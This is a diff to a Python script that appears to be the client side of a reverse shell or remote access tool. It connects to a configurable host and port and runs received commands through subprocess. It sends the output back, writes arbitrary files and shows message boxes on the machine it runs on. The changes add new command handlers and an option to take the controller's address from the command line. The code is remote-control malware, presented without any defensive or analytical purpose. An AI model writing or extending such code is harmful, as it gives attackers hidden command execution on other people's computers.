@@ -5,6 +5,7 @@ import sys
 from tkinter import messagebox
 
 HOST = "127.0.0.1"
+#HOST = sys.argv[1]
 
 PORT = 5003
 BUFFER_SIZE = 1024 * 128 
@@ -29,7 +30,7 @@ while True:
             output = str(e)
         else:
             output = ""
-            
+
     if splited_command[0].lower() == "file":
         name = splited_command[1]
         with open(name,"w+") as f:
@@ -42,9 +43,15 @@ while True:
         messagebox.showerror("ERROR!!!!",splited_command[1:])
         output = ''
 
+    if splited_command[0].lower() == "ping":
+        output = ''
+
+    if splited_command[0].lower() == "promt":
+        print(' '.join(splited_command[1:]))
+        output = ''
+
     else:
         output = subprocess.getoutput(command)
-    cwd = os.getcwd()
-    message = f"{output}{SEPARATOR}{cwd}"
+    message = f"{output}\n"
     s.send(message.encode())
 s.close()
